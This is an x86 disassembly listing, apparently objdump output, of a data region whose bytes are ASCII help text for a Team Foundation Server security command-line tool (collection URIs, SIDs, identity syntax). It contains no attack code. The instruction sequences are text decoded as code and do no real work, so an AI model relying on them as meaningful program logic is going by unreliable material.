  4066e6:	ins    BYTE PTR es:[edi],dx
  4066e7:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4066ec:	outs   dx,BYTE PTR ds:[esi]
  4066ed:	sub    eax,0x6576656c
  4066f2:	ins    BYTE PTR es:[edi],dx
  4066f3:	sub    al,0x20
  4066f5:	outs   dx,DWORD PTR ds:[esi]
  4066f6:	jb     0x406718
  4066f8:	jo     0x40676c
  4066fa:	outs   dx,DWORD PTR ds:[esi]
  4066fb:	push   0x65
  4066fd:	arpl   WORD PTR [ebp+ebp*1+0x6c],si
  406701:	gs jbe 0x406769
  406704:	ins    BYTE PTR es:[edi],dx
  406705:	and    BYTE PTR [edi+0x72],ah
  406708:	outs   dx,DWORD PTR ds:[esi]
  406709:	jne    0x40677b
  40670b:	cs or  eax,0x200a0d0a
  406711:	and    BYTE PTR [eax],ah
  406713:	and    BYTE PTR [eax],ah
  406715:	and    BYTE PTR [eax],ah
  406717:	and    BYTE PTR [edi],ch
  406719:	popa   
  40671a:	arpl   WORD PTR [eax+eiz*1+0x6e],bp
  40671e:	popa   
  40671f:	ins    DWORD PTR es:[edi],dx
  406720:	gs jae 0x406793
  406723:	popa   
  406724:	arpl   WORD PTR [ebp+0x20],sp
  406727:	je     0x406798
  406729:	imul   esp,DWORD PTR [ebp+0x6e],0x20
  40672d:	sub    BYTE PTR [edi],ch
  40672f:	arpl   WORD PTR [edi+0x6c],bp
  406732:	ins    BYTE PTR es:[edi],dx
  406733:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  406738:	outs   dx,BYTE PTR ds:[esi]
  406739:	cmp    al,BYTE PTR [ebx+0x6f]
  40673c:	ins    BYTE PTR es:[edi],dx
  40673d:	ins    BYTE PTR es:[edi],dx
  40673e:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  406743:	outs   dx,BYTE PTR ds:[esi]
  406744:	push   ebp
  406745:	push   edx
  406746:	dec    ecx
  406747:	and    BYTE PTR [eax+eiz*1+0x2f],bh
  40674b:	jae    0x4067b2
  40674d:	jb     0x4067c5
  40674f:	gs jb  0x40678c
  406752:	push   ebx
  406753:	gs jb  0x4067cc
  406756:	gs jb  0x4067ae
  406759:	push   edx
  40675a:	dec    ecx
  40675b:	sub    DWORD PTR ds:0x2020200a,ecx
  406761:	and    BYTE PTR [eax],ah
  406763:	and    BYTE PTR [eax],ah
  406765:	and    BYTE PTR [eax],ah
  406767:	and    BYTE PTR [eax],ah
  406769:	and    BYTE PTR [ecx+ebp*2+0x73],al
  40676d:	jo     0x4067db
  40676f:	popa   
  406770:	jns    0x4067e5
  406772:	and    BYTE PTR [eax+ebp*2+0x65],dh
  406776:	and    BYTE PTR [ecx+0x63],ah
  406779:	arpl   WORD PTR [ebp+0x73],sp
  40677c:	jae    0x40679e
  40677e:	arpl   WORD PTR [edi+0x6e],bp
  406781:	je     0x4067f5
  406783:	outs   dx,DWORD PTR ds:[esi]
  406784:	ins    BYTE PTR es:[edi],dx
  406785:	and    BYTE PTR [ecx+ebp*2+0x73],ch
  406789:	je     0x4067ab
  40678b:	outs   dx,WORD PTR ds:[esi]
  40678d:	jb     0x4067af
  40678f:	popa   
  406790:	and    BYTE PTR [eax+0x61],dh
  406793:	jb     0x406809
  406795:	imul   esp,DWORD PTR [ebx+0x75],0x2072616c
  40679c:	outs   dx,DWORD PTR ds:[esi]
  40679d:	bound  ebp,QWORD PTR [edx+0x65]
  4067a0:	arpl   WORD PTR [esi+ebp*1+0x1],si
  4067a4:	clc    
  4067a5:	add    al,0x53
  4067a7:	jo     0x40680e
  4067a9:	arpl   WORD PTR [ecx+0x66],bp
  4067ac:	jns    0x406817
  4067ae:	outs   dx,BYTE PTR ds:[esi]
  4067af:	and    BYTE PTR [si+0x68],dh
  4067b3:	and    BYTE PTR gs:[ebx+0x65],dh
  4067b7:	jb     0x40682f
  4067b9:	gs jb  0x4067dc
  4067bc:	outs   dx,DWORD PTR ds:[esi]
  4067bd:	jb     0x4067df
  4067bf:	je     0x406829
  4067c1:	and    BYTE PTR gs:[ebx+0x6f],ah
  4067c5:	ins    BYTE PTR es:[edi],dx
  4067c6:	ins    BYTE PTR es:[edi],dx
  4067c7:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4067cc:	outs   dx,BYTE PTR ds:[esi]
  4067cd:	cmp    cl,BYTE PTR ds:0x200a0d0a
  4067d3:	and    BYTE PTR [eax],ah
  4067d5:	and    BYTE PTR [edi+0x6e],cl
  4067d8:	and    BYTE PTR gs:[edi+0x66],ch
  4067dc:	and    BYTE PTR [eax+ebp*2+0x65],dh
  4067e0:	and    BYTE PTR [edi+esi*2+0x6f],dh
  4067e4:	and    BYTE PTR [esi+0x6f],ah
  4067e7:	ins    BYTE PTR es:[edi],dx
  4067e8:	ins    BYTE PTR es:[edi],dx
  4067e9:	outs   dx,DWORD PTR ds:[esi]
  4067ea:	ja     0x406855
  4067ec:	outs   dx,BYTE PTR ds:[esi]
  4067ed:	and    BYTE PTR [bx+si+0x61],dh
  4067f1:	jb     0x406854
  4067f3:	ins    DWORD PTR es:[edi],dx
  4067f4:	gs je  0x40685c
  4067f7:	jb     0x40686c
  4067f9:	and    BYTE PTR [ecx+0x73],ch
  4067fc:	and    BYTE PTR [edx+0x65],dh
  4067ff:	jno    0x406876
  406801:	imul   esi,DWORD PTR [edx+0x65],0x54202e64
  406808:	push   0x61702065
  40680d:	jb     0x406870
  40680f:	ins    DWORD PTR es:[edi],dx
  406810:	gs je  0x406878
  406813:	jb     0x406835
  406815:	imul   esi,DWORD PTR [ebx+0x20],0x64657375
  40681c:	and    BYTE PTR [edi+ebp*2+0x20],dh
  406820:	jae    0x406892
  406822:	arpl   WORD PTR gs:[ecx+0x66],bp
  406826:	jns    0x406848
  406828:	je     0x406892
  40682a:	and    BYTE PTR gs:[ebp+eiz*2+0x76],ch
  40682f:	gs ins BYTE PTR es:[edi],dx
  406831:	cs or  eax,0x200a0d0a
  406837:	and    BYTE PTR [eax],ah
  406839:	and    BYTE PTR [eax],ah
  40683b:	and    BYTE PTR [eax],ah
  40683d:	das    
  40683e:	arpl   WORD PTR [edi+0x6c],bp
  406841:	ins    BYTE PTR es:[edi],dx
  406842:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  406847:	outs   dx,BYTE PTR ds:[esi]
  406848:	cmp    al,BYTE PTR [ebx+0x6f]
  40684b:	ins    BYTE PTR es:[edi],dx
  40684c:	ins    BYTE PTR es:[edi],dx
  40684d:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  406852:	outs   dx,BYTE PTR ds:[esi]
  406853:	push   ebp
  406854:	push   edx
  406855:	dec    ecx
  406856:	and    BYTE PTR ds:0x71655220,ch
  40685c:	jne    0x4068c7
  40685e:	jb     0x4068c5
  406860:	and    BYTE PTR fs:[ecx+0x66],ch
  406864:	and    BYTE PTR [edi],ch
  406866:	jae    0x4068cd
  406868:	jb     0x4068e0
  40686a:	gs jb  0x40688d
  40686d:	imul   esi,DWORD PTR [ebx+0x20],0x20746f6e
  406874:	jne    0x4068e9
  406876:	gs fs and BYTE PTR cs:[ebx+0x70],dl
  40687c:	arpl   WORD PTR gs:[ecx+0x66],bp
  406880:	imul   esp,DWORD PTR [ebp+0x73],0x65687420
  406887:	and    BYTE PTR [ebp+0x52],dl
  40688a:	dec    ecx
  40688b:	and    BYTE PTR [edi+0x66],ch
  40688e:	and    BYTE PTR [eax+ebp*2+0x65],dh
  406892:	and    BYTE PTR [ebp+eiz*2+0x61],dh
  406896:	ins    DWORD PTR es:[edi],dx
  406897:	and    BYTE PTR [eax+0x72],dh
  40689a:	outs   dx,DWORD PTR ds:[esi]
  40689b:	push   0x65
  40689d:	arpl   WORD PTR [eax+eiz*1+0x63],si
  4068a1:	outs   dx,DWORD PTR ds:[esi]
  4068a2:	ins    BYTE PTR es:[edi],dx
  4068a3:	ins    BYTE PTR es:[edi],dx
  4068a4:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4068a9:	outs   dx,BYTE PTR ds:[esi]
  4068aa:	and    BYTE PTR cs:[eax+ebp*2+0x65],dl
  4068af:	and    BYTE PTR [edi+0x72],ah
  4068b2:	outs   dx,DWORD PTR ds:[esi]
  4068b3:	jne    0x406925
  4068b5:	and    BYTE PTR [edi+0x69],dh
  4068b8:	ins    BYTE PTR es:[edi],dx
  4068b9:	ins    BYTE PTR es:[edi],dx
  4068ba:	and    BYTE PTR [edx+0x65],ah
  4068bd:	and    BYTE PTR [ebx+0x72],ah
  4068c0:	gs popa 
  4068c2:	je     0x406929
  4068c4:	and    BYTE PTR fs:[ecx+0x74],ah
  4068c8:	and    BYTE PTR [eax+ebp*2+0x65],dh
  4068cc:	and    BYTE PTR [ebx+0x6f],ah
  4068cf:	ins    BYTE PTR es:[edi],dx
  4068d0:	ins    BYTE PTR es:[edi],dx
  4068d1:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4068d6:	outs   dx,BYTE PTR ds:[esi]
  4068d7:	sub    eax,0x6576656c
  4068dc:	ins    BYTE PTR es:[edi],dx
  4068dd:	and    BYTE PTR cs:[eax+ebp*2+0x65],dl
  4068e2:	and    BYTE PTR [esi+0x6f],ah
  4068e5:	jb     0x406954
  4068e7:	popa   
  4068e8:	je     0x40690a
  4068ea:	outs   dx,WORD PTR ds:[esi]
  4068ec:	jb     0x40690e
  4068ee:	je     0x406958
  4068f0:	and    BYTE PTR gs:[ebp+0x52],dl
  4068f4:	dec    ecx
  4068f5:	and    BYTE PTR [ecx+0x73],ch
  4068f8:	and    BYTE PTR [eax+0x74],ch
  4068fb:	je     0x40696d
  4068fd:	cmp    ch,BYTE PTR [edi]
  4068ff:	das    
  406900:	push   ebx
  406901:	gs jb  0x40697a
  406904:	gs jb  0x406955
  406907:	popa   
  406908:	ins    DWORD PTR es:[edi],dx
  406909:	cmp    dh,BYTE PTR gs:[eax+0x6f]
  40690d:	jb     0x406983
  40690f:	das    
  406910:	push   esi
  406911:	imul   esi,DWORD PTR [edx+0x74],0x446c6175
  406918:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  40691f:	jns    0x40696f
  406921:	popa   
  406922:	ins    DWORD PTR es:[edi],dx
  406923:	gs das 
  406925:	inc    ebx
  406926:	outs   dx,DWORD PTR ds:[esi]
  406927:	ins    BYTE PTR es:[edi],dx
  406928:	ins    BYTE PTR es:[edi],dx
  406929:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40692e:	outs   dx,BYTE PTR ds:[esi]
  40692f:	dec    esi
  406930:	popa   
  406931:	ins    DWORD PTR es:[edi],dx
  406932:	gs or  eax,0x200a0d0a
  406938:	and    BYTE PTR [eax],ah
  40693a:	and    BYTE PTR [eax],ah
  40693c:	and    BYTE PTR [eax],ah
  40693e:	das    
  40693f:	jae    0x4069a6
  406941:	jb     0x4069b9
  406943:	gs jb  0x406980
  406946:	push   ebx
  406947:	gs jb  0x4069c0
  40694a:	gs jb  0x4069a2
  40694d:	push   edx
  40694e:	dec    ecx
  40694f:	and    BYTE PTR ds:0x71655220,ch
  406955:	jne    0x4069c0
  406957:	jb     0x4069be
  406959:	and    BYTE PTR fs:[ecx+0x66],ch
  40695d:	and    BYTE PTR [edi],ch
  40695f:	arpl   WORD PTR [edi+0x6c],bp
  406962:	ins    BYTE PTR es:[edi],dx
  406963:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  406968:	outs   dx,BYTE PTR ds:[esi]
  406969:	and    BYTE PTR [ecx+0x73],ch
  40696c:	and    BYTE PTR [esi+0x6f],ch
  40696f:	je     0x406991
  406971:	jne    0x4069e6
  406973:	gs fs and BYTE PTR cs:[ebx+0x70],dl
  406979:	arpl   WORD PTR gs:[ecx+0x66],bp
  40697d:	imul   esp,DWORD PTR [ebp+0x73],0x65687420
  406984:	and    BYTE PTR [ebp+0x52],dl
  406987:	dec    ecx
  406988:	and    BYTE PTR [edi+0x66],ch
  40698b:	and    BYTE PTR [ecx+0x6e],ah
  40698e:	and    BYTE PTR [ecx+0x70],ah
  406991:	jo     0x4069ff
  406993:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  40699a:	sub    eax,0x72656974
  40699f:	and    BYTE PTR [ebx+0x65],dh
  4069a2:	jb     0x406a1a
  4069a4:	gs jb  0x4069d5
  4069a7:	and    BYTE PTR [eax+ebp*2+0x65],dl
  4069ab:	and    BYTE PTR [edi+0x72],ah
  4069ae:	outs   dx,DWORD PTR ds:[esi]
  4069af:	jne    0x406a21
  4069b1:	and    BYTE PTR [edi+0x69],dh
  4069b4:	ins    BYTE PTR es:[edi],dx
  4069b5:	ins    BYTE PTR es:[edi],dx
  4069b6:	and    BYTE PTR [edx+0x65],ah
  4069b9:	and    BYTE PTR [ebx+0x72],ah
  4069bc:	gs popa 
  4069be:	je     0x406a25
  4069c0:	and    BYTE PTR fs:[ecx+0x74],ah
  4069c4:	and    BYTE PTR [eax+ebp*2+0x65],dh
  4069c8:	and    BYTE PTR [ecx+0x6e],ch
  4069cb:	jae    0x406a41
  4069cd:	popa   
  4069ce:	outs   dx,BYTE PTR ds:[esi]
  4069cf:	arpl   WORD PTR [ebp+0x2d],sp
  4069d2:	ins    BYTE PTR es:[edi],dx
  4069d3:	gs jbe 0x406a3b
  4069d6:	ins    BYTE PTR es:[edi],dx
  4069d7:	and    BYTE PTR cs:[eax+ebp*2+0x65],dl
  4069dc:	and    BYTE PTR [esi+0x6f],ah
  4069df:	jb     0x406a4e
  4069e1:	popa   
  4069e2:	je     0x406a04
  4069e4:	outs   dx,WORD PTR ds:[esi]
  4069e6:	jb     0x406a08
  4069e8:	je     0x406a52
  4069ea:	and    BYTE PTR gs:[ebp+0x52],dl
  4069ee:	dec    ecx
  4069ef:	and    BYTE PTR [ecx+0x73],ch
  4069f2:	and    BYTE PTR [eax+0x74],ch
  4069f5:	je     0x406a67
  4069f7:	cmp    ch,BYTE PTR [edi]
  4069f9:	das    
  4069fa:	push   ebx
  4069fb:	gs jb  0x406a74
  4069fe:	gs jb  0x406a4f
  406a01:	popa   
  406a02:	ins    DWORD PTR es:[edi],dx
  406a03:	cmp    dh,BYTE PTR gs:[eax+0x6f]
  406a07:	jb     0x406a7d
  406a09:	das    
  406a0a:	push   esi
  406a0b:	imul   esi,DWORD PTR [edx+0x74],0x446c6175
  406a12:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  406a19:	jns    0x406a69
  406a1b:	popa   
  406a1c:	ins    DWORD PTR es:[edi],dx
  406a1d:	gs add esi,ebp
  406a20:	or     al,0x49
  406a22:	fs outs dx,BYTE PTR gs:[esi]
  406a25:	je     0x406a90
  406a27:	je     0x406aa2
  406a29:	and    BYTE PTR [ebx+0x70],dl
  406a2c:	arpl   WORD PTR gs:[ecx+0x66],bp
  406a30:	imul   esp,DWORD PTR [ebp+0x72],0xa0d3a73
  406a37:	or     eax,0x2020200a
  406a3c:	and    BYTE PTR [eax],ah
  406a3e:	and    BYTE PTR [eax],ah
  406a40:	and    BYTE PTR [ebx+0x69],dh
  406a43:	cmp    dh,BYTE PTR fs:[ebx+0x69]
  406a47:	and    BYTE PTR fs:0x66655220,ch
  406a4e:	gs jb  0x406ab6
  406a51:	outs   dx,BYTE PTR ds:[esi]
  406a52:	arpl   WORD PTR [ebp+0x73],sp
  406a55:	and    BYTE PTR [eax+ebp*2+0x65],dh
  406a59:	and    BYTE PTR [ecx+0x64],ch
  406a5c:	outs   dx,BYTE PTR gs:[esi]
  406a5e:	je     0x406ac9
  406a60:	je     0x406adb
  406a62:	and    BYTE PTR [edi+0x69],dh
  406a65:	je     0x406acf
  406a67:	and    BYTE PTR [eax+ebp*2+0x65],dh
  406a6b:	and    BYTE PTR [ebx+0x70],dh
  406a6e:	arpl   WORD PTR gs:[ecx+0x66],bp
  406a72:	imul   esp,DWORD PTR [ebp+0x64],0x44495320
  406a79:	cs or  eax,0x2020200a
  406a7f:	and    BYTE PTR [eax],ah
  406a81:	and    BYTE PTR [eax],ah
  406a83:	and    BYTE PTR [eax],ah
  406a85:	and    BYTE PTR [eax],ah
  406a87:	and    BYTE PTR [ebp+0x78],al
  406a8a:	popa   
  406a8b:	ins    DWORD PTR es:[edi],dx
  406a8c:	jo     0x406afa
  406a8e:	cmp    ah,BYTE PTR gs:[eax]
  406a91:	and    BYTE PTR [eax],ah
  406a93:	jae    0x406afe
  406a95:	cmp    dl,BYTE PTR fs:[ebx+0x2d]
  406a99:	xor    DWORD PTR ds:0x31322d35,ebp
  406a9f:	sub    eax,0x37323132
  406aa4:	xor    eax,0x38313132
  406aa9:	xor    al,0x2d
  406aab:	xor    DWORD PTR [esi],esi
  406aad:	xor    BYTE PTR [eax+esi*1],dh
  406ab0:	xor    DWORD PTR [edx],esi
  406ab2:	cmp    DWORD PTR [edx],esi
  406ab4:	xor    BYTE PTR ds:0x37383831,ch
  406aba:	cmp    DWORD PTR [edx],esi
  406abc:	aaa    
  406abd:	xor    eax,0x352d3732
  406ac2:	cmp    BYTE PTR [eax],bh
  406ac4:	xor    esi,DWORD PTR [eax+esi*1]
  406ac7:	or     eax,0x200a0d0a
  406acc:	and    BYTE PTR [eax],ah
  406ace:	and    BYTE PTR [eax],ah
  406ad0:	and    BYTE PTR [eax],ah
  406ad2:	and    BYTE PTR [esi+0x3a],ch
  406ad5:	pop    ebx
  406ad6:	outs   dx,DWORD PTR fs:[esi]
  406ad8:	ins    DWORD PTR es:[edi],dx
  406ad9:	popa   
  406ada:	imul   ebp,DWORD PTR [esi+0x5c],0x6d616e5d
  406ae1:	and    BYTE PTR gs:0x66655220,ch
  406ae8:	gs jb  0x406b50
  406aeb:	outs   dx,BYTE PTR ds:[esi]
  406aec:	arpl   WORD PTR [ebp+0x73],sp
  406aef:	and    BYTE PTR [eax+ebp*2+0x65],dh
  406af3:	and    BYTE PTR [ecx+0x64],ch
  406af6:	outs   dx,BYTE PTR gs:[esi]
  406af8:	je     0x406b63
  406afa:	je     0x406b75
  406afc:	and    BYTE PTR [edi+0x69],dh
  406aff:	je     0x406b69
  406b01:	and    BYTE PTR [eax+ebp*2+0x65],dh
  406b05:	and    BYTE PTR [ebx+0x70],dh
  406b08:	arpl   WORD PTR gs:[ecx+0x66],bp
  406b0c:	imul   esp,DWORD PTR [ebp+0x64],0x6d616e20
  406b13:	gs and BYTE PTR cs:[esi+0x6f],al
  406b18:	jb     0x406b3a
  406b1a:	push   edi
  406b1b:	imul   ebp,DWORD PTR [esi+0x64],0x2c73776f
  406b22:	and    BYTE PTR [esi+0x61],ch
  406b25:	ins    DWORD PTR es:[edi],dx
  406b26:	and    BYTE PTR gs:[ecx+0x73],ch
  406b2a:	and    BYTE PTR [eax+ebp*2+0x65],dh
  406b2e:	and    BYTE PTR [edi+ebp*2+0x67],ch
  406b32:	outs   dx,DWORD PTR ds:[esi]
  406b33:	outs   dx,BYTE PTR ds:[esi]
  406b34:	and    BYTE PTR [esi+0x61],ch
  406b37:	ins    DWORD PTR es:[edi],dx
  406b38:	gs and BYTE PTR cs:[ecx+0x66],cl
  406b3d:	and    BYTE PTR [eax+ebp*2+0x65],dh
  406b41:	and    BYTE PTR [edx+0x65],dh
  406b44:	data16 gs jb 0x406bad
  406b48:	outs   dx,BYTE PTR ds:[esi]
  406b49:	arpl   WORD PTR [ebp+0x64],sp
  406b4c:	and    BYTE PTR [ecx+0x64],ch
  406b4f:	outs   dx,BYTE PTR gs:[esi]
  406b51:	je     0x406bbc
  406b53:	je     0x406bce
  406b55:	and    BYTE PTR [ecx+0x73],ch
  406b58:	and    BYTE PTR [ecx+0x6e],ch
  406b5b:	and    BYTE PTR [ecx+0x20],ah
  406b5e:	outs   dx,DWORD PTR fs:[esi]
  406b60:	ins    DWORD PTR es:[edi],dx
  406b61:	popa   
  406b62:	imul   ebp,DWORD PTR [esi+0x2c],0x65687420
  406b69:	and    BYTE PTR [edi+ebp*2+0x6d],ah
  406b6d:	popa   
  406b6e:	imul   ebp,DWORD PTR [esi+0x20],0x656d616e
  406b75:	and    BYTE PTR [ecx+0x73],ch
  406b78:	and    BYTE PTR [edx+0x65],dh
  406b7b:	jno    0x406bf2
  406b7d:	imul   esi,DWORD PTR [edx+0x65],0x20202e64
  406b84:	inc    esi
  406b85:	outs   dx,DWORD PTR ds:[esi]
  406b86:	jb     0x406ba8
  406b88:	popa   
  406b89:	jo     0x406bfb
  406b8b:	ins    BYTE PTR es:[edi],dx
  406b8c:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  406b93:	and    BYTE PTR [edi+0x72],ah
  406b96:	outs   dx,DWORD PTR ds:[esi]
  406b97:	jne    0x406c09
  406b99:	jae    0x406bc7
  406b9b:	and    BYTE PTR [esi+0x61],ch
  406b9e:	ins    DWORD PTR es:[edi],dx
  406b9f:	and    BYTE PTR gs:[ecx+0x73],ch
  406ba3:	and    BYTE PTR [eax+ebp*2+0x65],dh
  406ba7:	and    BYTE PTR [edi+0x72],ah
  406baa:	outs   dx,DWORD PTR ds:[esi]
  406bab:	jne    0x406c1d
  406bad:	and    BYTE PTR [ecx+ebp*2+0x73],ah
  406bb1:	jo     0x406c1f
  406bb3:	popa   
  406bb4:	jns    0x406bd6
  406bb6:	outs   dx,BYTE PTR ds:[esi]
  406bb7:	popa   
  406bb8:	ins    DWORD PTR es:[edi],dx
  406bb9:	and    BYTE PTR gs:[ecx+0x6e],ah
  406bbd:	and    BYTE PTR fs:[edi+ebp*2+0x6d],ah
  406bc2:	popa   
  406bc3:	imul   ebp,DWORD PTR [esi+0x20],0x74207369
  406bca:	push   0x52552065
  406bcf:	dec    ecx
  406bd0:	and    BYTE PTR [edi+0x72],ch
  406bd3:	and    BYTE PTR [edi+0x55],al
  406bd6:	dec    ecx
  406bd7:	inc    esp
  406bd8:	and    BYTE PTR [edi+0x66],ch
  406bdb:	and    BYTE PTR [eax+ebp*2+0x65],dh
  406bdf:	and    BYTE PTR [ebx+0x6f],ah
  406be2:	outs   dx,BYTE PTR ds:[esi]
  406be3:	je     0x406c46
  406be5:	imul   ebp,DWORD PTR [esi+0x69],0x7020676e
  406bec:	jb     0x406c5d
  406bee:	push   0x65
  406bf0:	arpl   WORD PTR [esi+ebp*1+0x20],si
  406bf4:	dec    ecx
  406bf5:	outs   dx,BYTE PTR ds:[esi]
  406bf6:	and    BYTE PTR [eax+ebp*2+0x69],dh
  406bfa:	jae    0x406c1c
  406bfc:	arpl   WORD PTR [edi+0x6e],bp
  406bff:	je     0x406c66
  406c01:	js     0x406c77
  406c03:	sub    al,0x20
  406c05:	imul   esp,DWORD PTR [esi+0x20],0x616d6f64
  406c0c:	imul   ebp,DWORD PTR [esi+0x20],0x6f207369
  406c13:	ins    DWORD PTR es:[edi],dx
  406c14:	imul   esi,DWORD PTR [esp+esi*2+0x65],0x74202c64
  406c1c:	push   0x63732065
  406c21:	outs   dx,DWORD PTR ds:[esi]
  406c22:	jo     0x406c89
  406c24:	and    BYTE PTR [ecx+0x73],ch
  406c27:	and    BYTE PTR [ecx+0x73],ah
  406c2a:	jae    0x406ca1
  406c2c:	ins    DWORD PTR es:[edi],dx
  406c2d:	gs and BYTE PTR fs:[edi+ebp*2+0x20],dh
  406c33:	bound  esp,QWORD PTR [ebp+0x20]
  406c36:	arpl   WORD PTR [edi+0x6c],bp
  406c39:	ins    BYTE PTR es:[edi],dx
  406c3a:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  406c3f:	outs   dx,BYTE PTR ds:[esi]
  406c40:	sub    eax,0x6576656c
  406c45:	ins    BYTE PTR es:[edi],dx
  406c46:	cs or  eax,0x2020200a
  406c4c:	and    BYTE PTR [eax],ah
  406c4e:	and    BYTE PTR [eax],ah
  406c50:	and    BYTE PTR [eax],ah
  406c52:	and    BYTE PTR [eax],ah
  406c54:	and    BYTE PTR [ebp+0x78],al
  406c57:	popa   
  406c58:	ins    DWORD PTR es:[edi],dx
  406c59:	jo     0x406cc7
  406c5b:	cmp    ah,BYTE PTR gs:[eax]
  406c5e:	push   esp
  406c5f:	outs   dx,DWORD PTR ds:[esi]
  406c60:	and    BYTE PTR [edx+0x65],dh
  406c63:	data16 gs jb 0x406ccc
  406c67:	outs   dx,BYTE PTR ds:[esi]
  406c68:	arpl   WORD PTR [ebp+0x20],sp
  406c6b:	je     0x406cd5
  406c6d:	and    BYTE PTR gs:[ecx+0x64],ch
  406c71:	outs   dx,BYTE PTR gs:[esi]
  406c73:	je     0x406cde
  406c75:	je     0x406cf0
  406c77:	and    BYTE PTR [edi+0x66],ch
  406c7a:	and    BYTE PTR [eax+ebp*2+0x65],dh
  406c7e:	and    BYTE PTR [ebp+0x73],dh
  406c81:	gs jb  0x406ca4
  406c84:	and    cl,BYTE PTR [edx+0x6f]
  406c87:	push   0x6550206e
  406c8c:	outs   dx,DWORD PTR ds:[esi]
  406c8d:	jo     0x406cfb
  406c8f:	gs jae 0x406cb4
  406c92:	and    BYTE PTR [ecx+0x6e],ch
  406c95:	and    BYTE PTR [eax+ebp*2+0x65],dh
  406c99:	and    BYTE PTR [edi+ebp*2+0x6d],ah
  406c9d:	popa   
  406c9e:	imul   ebp,DWORD PTR [esi+0x20],0x74614422
  406ca5:	jne    0x406d14
  406ca7:	xor    DWORD PTR [edx],esp
  406ca9:	and    BYTE PTR [ecx+0x74],ah
  406cac:	and    BYTE PTR [eax+ebp*2+0x65],dh
  406cb0:	and    BYTE PTR [esi+0x69],ah
  406cb3:	arpl   WORD PTR [ecx+ebp*2+0x74],si
  406cb7:	imul   ebp,DWORD PTR [edi+0x75],0x6f632073
  406cbe:	ins    DWORD PTR es:[edi],dx
  406cbf:	jo     0x406d22
  406cc1:	outs   dx,BYTE PTR ds:[esi]
  406cc2:	jns    0x406ce4
  406cc4:	and    al,BYTE PTR [ecx+0x2e]
  406cc7:	and    BYTE PTR [ecx+eiz*2+0x74],al
  406ccb:	jne    0x406d3a
  406ccd:	and    BYTE PTR [ebx+0x6f],al
  406cd0:	jb     0x406d42
  406cd2:	outs   dx,DWORD PTR ds:[esi]
  406cd3:	jb     0x406d36
  406cd5:	je     0x406d40
  406cd7:	outs   dx,DWORD PTR ds:[esi]
  406cd8:	outs   dx,BYTE PTR ds:[esi]
  406cd9:	sub    al,0x20
  406cdb:	jns    0x406d4c
  406cdd:	jne    0x406cff
  406cdf:	ja     0x406d50
  406ce1:	jne    0x406d4f
  406ce3:	and    BYTE PTR fs:[ebp+0x73],dh
  406ce7:	and    BYTE PTR gs:[eax+ebp*2+0x65],dh
  406cec:	and    BYTE PTR [esi+0x6f],ah
  406cef:	ins    BYTE PTR es:[edi],dx
  406cf0:	ins    BYTE PTR es:[edi],dx
  406cf1:	outs   dx,DWORD PTR ds:[esi]
  406cf2:	ja     0x406d5d
  406cf4:	outs   dx,BYTE PTR ds:[esi]
  406cf5:	and    BYTE PTR [bp+di+0x79],dh
  406cf9:	outs   dx,BYTE PTR ds:[esi]
  406cfa:	je     0x406d5d
  406cfc:	js     0x406d38
  406cfe:	or     eax,0x2020200a
  406d03:	and    BYTE PTR [eax],ah
  406d05:	and    BYTE PTR [eax],ah
  406d07:	and    BYTE PTR [eax],ah
  406d09:	and    BYTE PTR [eax],ah
  406d0b:	and    BYTE PTR [eax],ah
  406d0d:	and    BYTE PTR [eax],ah
  406d0f:	and    BYTE PTR [esi+0x3a],ch
  406d12:	inc    esp
  406d13:	inc    ecx
  406d14:	push   esp
  406d15:	push   ebp
  406d16:	dec    ebp
  406d17:	xor    DWORD PTR [edx+ebp*2+0x70],ebx
  406d1b:	outs   dx,DWORD PTR gs:[esi]
  406d1d:	jo     0x406d8b
  406d1f:	gs jae 0x406d2f
  406d22:	or     ah,BYTE PTR [eax]
  406d24:	and    BYTE PTR [eax],ah
  406d26:	and    BYTE PTR [eax],ah
  406d28:	and    BYTE PTR [eax],ah
  406d2a:	and    BYTE PTR [eax],ah
  406d2c:	and    BYTE PTR [eax],ah
  406d2e:	and    BYTE PTR [ebp+0x78],al
  406d31:	popa   
  406d32:	ins    DWORD PTR es:[edi],dx
  406d33:	jo     0x406da1
  406d35:	cmp    ah,BYTE PTR gs:[eax]
  406d38:	push   esp
  406d39:	outs   dx,DWORD PTR ds:[esi]
  406d3a:	and    BYTE PTR [edx+0x65],dh
  406d3d:	data16 gs jb 0x406da6
  406d41:	outs   dx,BYTE PTR ds:[esi]
  406d42:	arpl   WORD PTR [ebp+0x20],sp
  406d45:	popa   
  406d46:	jo     0x406db8
  406d48:	ins    BYTE PTR es:[edi],dx
  406d49:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  406d50:	and    BYTE PTR [edi+0x72],ah
  406d53:	outs   dx,DWORD PTR ds:[esi]
  406d54:	jne    0x406dc6
  406d56:	jae    0x406d84
  406d58:	and    BYTE PTR [ecx+0x6f],bh
  406d5b:	jne    0x406d7d
  406d5d:	arpl   WORD PTR [edi+0x75],bp
  406d60:	ins    BYTE PTR es:[edi],dx
  406d61:	and    BYTE PTR fs:[ebp+0x73],dh
  406d65:	and    BYTE PTR gs:[ebp+0x69],ah
  406d69:	je     0x406dd3
  406d6b:	gs jb  0x406d8e
  406d6e:	outs   dx,DWORD PTR ds:[esi]
  406d6f:	data16 and BYTE PTR [eax+ebp*2+0x65],dh
  406d74:	and    BYTE PTR [esi+0x6f],ah
  406d77:	ins    BYTE PTR es:[edi],dx
  406d78:	ins    BYTE PTR es:[edi],dx
  406d79:	outs   dx,DWORD PTR ds:[esi]
  406d7a:	ja     0x406de5
  406d7c:	outs   dx,BYTE PTR ds:[esi]
  406d7d:	and    BYTE PTR [bp+di+0x79],dh
  406d81:	outs   dx,BYTE PTR ds:[esi]
  406d82:	je     0x406de5
